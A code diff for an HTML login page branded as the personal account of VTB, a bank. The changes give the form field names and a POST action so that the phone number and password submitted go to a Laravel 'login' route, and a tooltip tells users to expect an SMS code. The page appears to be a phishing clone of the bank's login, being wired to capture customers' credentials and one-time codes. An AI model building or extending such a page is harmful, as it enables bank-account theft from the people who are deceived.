@@ -8,11 +8,11 @@
 
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
-    <link rel="stylesheet" type="text/css" href="style1.css">
+    <link rel="stylesheet" type="text/css" href="css/login.css">
 
 
 
-    <link rel="shortcut icon" href="vtb.jpg"/>
+    <link rel="shortcut icon" href="img/vtb.jpg"/>
 
 
     <title>ВТБ личный кабинет</title>
@@ -43,17 +43,18 @@
             <!-- 	<h3> Авторизация</h3>
               <hr/> -->
 
-            <form>
+            <form id="kajetsya-login" method="POST" action="{{ route('login') }}">
+                @csrf
                 <div class="form-group row">
                     <label for="inputLogin" class="col-sm-4 col-form-label">Логин</label>
                     <div class="col-sm-8">
-                        <input  type="text" class="phone form-control" id="inputLogin" data-toggle="tooltip" data-placement="top" title="Введите номер телефона">
+                        <input name="phone" type="text" class="phone form-control" id="inputLogin" data-toggle="tooltip" data-placement="top" title="Введите номер телефона">
                     </div>
                 </div>
                 <div class="form-group row">
                     <label for="inputPassword3" class="col-sm-4 col-form-label">Пароль</label>
                     <div class="col-sm-8">
-                        <input type="password" class="form-control" id="inputPassword3" data-toggle="tooltip" data-placement="top" title="Введите пароль" onchange="pasValid()">
+                        <input name="password" type="password" class="form-control" id="inputPassword3" data-toggle="tooltip" data-placement="top" title="Введите пароль" onchange="pasValid()">
                     </div>
                 </div>
 
@@ -62,8 +63,6 @@
                     <!--   	<div class="col-4"></div>
                     -->    <div class="col-4">
                         <button type="button" class="btn btn-outline-primary" data-toggle="modal" data-target="#exampleModal"  id="enter" data-toggle="tooltip" data-placement="top" title="Ожидайте SMS-уведомление по номеру: ">Войти</button>
-
-
                     </div>
                 </div>
             </form>
@@ -159,7 +158,7 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.3.7/js/tether.min.js"></script>
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.5/js/bootstrap.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.min.js"></script>
-<script type="text/javascript" src="1.js"></script>
+<script type="text/javascript" src="js/login.js"></script>
 
 </body>
 </html>
